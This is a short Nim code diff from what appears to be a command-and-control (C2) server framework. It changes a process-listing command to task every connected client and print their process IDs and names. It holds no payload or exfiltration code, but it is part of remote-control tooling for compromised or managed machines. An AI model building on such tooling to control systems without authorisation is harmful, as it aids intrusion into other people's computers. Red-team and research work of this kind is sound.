@@ -5,11 +5,12 @@ import ../../types, ../../communication, ../../logging
 import ../../../clientTasks/processes
 
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
-  let task = await processes.sendTask(server.cli.handlingClient)
-  await task.awaitResponse()
-
-  for process in server.cli.handlingClient.processes:
-    stdout.styledWriteLine fgGreen, $process.id, "\t", fgDefault, process.name 
+  for client in server.cli.handlingClient:
+    let task = await processes.sendTask(client)
+    if not task.isNil(): 
+      await task.awaitResponse()
+      for process in client.processes:
+        stdout.styledWriteLine fgGreen, $process.id, "\t", fgWhite, process.name 
 
 let cmd*: Command = Command(
   execProc: execProc,
